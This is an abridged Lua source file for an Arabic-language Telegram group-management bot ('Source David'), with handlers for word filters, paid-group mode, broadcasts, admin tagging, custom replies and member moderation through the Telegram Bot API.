usertext = '\n᥀︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DavidTeaM')..')'
...
if text == 'مطور السورس' or text == 'مطور سورس' or text == 'مطور ديفد' or text == 'مبرمج السورس' or text == 'مبرمج ديفد' then
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'᥀︙اهلا بك عزيزي\n᥀︙ان كان لديك استفسار او اي مشكلة\n᥀︙يمكنك مراسلة مطور السورس\n᥀︙حساب مطور السورس [اضـغـط هـنـا  𓆩•𝐀𝐁𝐁𝐀𝐒 𝐅𝐀𝐃𝐇𝐈𝐋•𓆪  ](t.me/TSTTT)')
end
---------------------
...
database:set(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ᥀︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."David1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."David1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ᥀︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."David1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."David1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."David1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ᥀︙ارسل الكلمه الان")  
database:set(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."David1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."David1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."David1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."David1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."David1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."David1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n᥀︙قائمة المنع \nٴ≪━━━━ David ━━━━≫ٴ\n"
for k,v in pairs(list) do  
local David_Msg = database:get(bot_id.."David1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..David_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح كليشه المطور' and DevDavid(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'᥀︙تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevDavid(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n᥀︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'DavidTeaM')..')'..'\n᥀︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الوضع المدفوع' and DevDavid(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,David) 
if not database:sismember(bot_id..'David:ProGroups',msg.chat_id_) then
database:sadd(bot_id..'David:ProGroups',msg.chat_id_) 
database:set(bot_id.."David:ProGroups:Time"..msg.chat_id_,os.date("%Y/%m/%d"))
David = '\n᥀︙المجموعه ['..David.title_..'] \n᥀︙تم تفعيل الوضع المدفوع بتاريخ '..os.date("%Y/%m/%d")..' \n᥀︙سينتهي الوضع المدفوع بعد 30 يوم من الان'
else
...
if text == 'تعطيل الوضع المدفوع' and DevDavid(msg) then  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,David) 
if database:sismember(bot_id..'David:ProGroups',msg.chat_id_) then
database:srem(bot_id..'David:ProGroups',msg.chat_id_) 
database:del(bot_id.."David:ProGroups:Time"..msg.chat_id_)
...
if text == 'المجموعات المدفوعه' or text == 'الكروبات المدفوعه' and DevDavid(msg) then
local List = database:smembers(bot_id.."David:ProGroups")
local David = '᥀︙المجموعات المدفوعه \n᥀︙تاريخ اليوم'..os.date("%Y/%m/%d")..' \nٴ≪━━━━ David ━━━━≫ٴ\n'
for k,v in pairs(List) do
local Davidgetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ديفد').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ديفد')
local David_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..David_Msg[math.random(#David_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevDavid(msg) then 
...
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:David:2',msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n᥀︙ارسل الكلمه التي تريد اضافتها')
database:set(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:David:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:David:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:David:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"᥀︙تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:David:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:David:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:David:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:David:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:David:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:David:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:David:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:David:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:David:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:David:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇Source David.',url="t.me/L9L9L"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."DavidTeaM:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'➫✿ تم تفعيل الانستا')
database:set(bot_id.."DavidTeaM:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."DavidTeaM:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."DavidTeaM:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"᥀︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."DavidTeaM:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."DavidTeaM:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس ديفد يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:David:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"᥀︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:David:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:David:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:David:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:David:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:David:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:David:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:David:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:David:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:David:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:David:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ديفد').." غادر" or text == 'غادر' then  
...
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي") and msg.reply_to_message_id_ == 0 and DevDavid(msg) then 
send(msg.chat_id_, msg.id_,'᥀︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
database:setex(bot_id.."Abs:EditDev"..msg.sender_user_id_,300,true)
end
if database:get(bot_id.."Abs:EditDev"..msg.sender_user_id_) then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'DavidTeaM')..')'
local iduser = result.sender_user_id_
...
local David = '᥀︙عدد الادمنيه : '..data.administrator_count_..
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,David,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (David.total_count_ or 0)
...
local rdphoto = Davida[math.random(#Davida)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, David.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
-- vardump(data) 
Daviddx(msg.chat_id_, msg.id_, '᥀︙ايدي المجموعة » ( '..msg.chat_id_..' )\n᥀︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n᥀︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n᥀︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
David = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,David)  
...
David = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,David)  
...
if text == 'استعاده الاوامر' and DevDavid(msg) then
...
{
{text = 'David 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/L9L9L"},
},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/David"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
...
if text and text:match("^زغرفه (.*)$") and database:get(bot_id.." David:zhrf_Bots"..msg.chat_id_) == "open" then
...
send(msg.chat_id_, msg.id_, t..'ٴ≪━━━━ David ━━━━≫ٴٴ\n᥀︙➫ .[🖨┇Source David. ](t.me/L9L9L)➤ ')
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ديفد')
...
David = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(David)
...
--------------------------------------------------------------------------------------------------------------
SourceDavid(data.message_,data)
plugin_David(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local DavidAbot = database:get(bot_id.."David1:Add:Filter:Rp2"..text..result.chat_id_)   
if DavidAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ᥀︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n᥀︙["..DavidAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local David1_Msg = database:get(bot_id.."David1:Add:Filter:Rp2"..text..result.chat_id_)   
if David1_Msg then    
send(msg.chat_id_, msg.id_," ᥀︙"..David1_Msg)
...
end -- end new msg dev.mr David 
end -- end callback dev.mr David
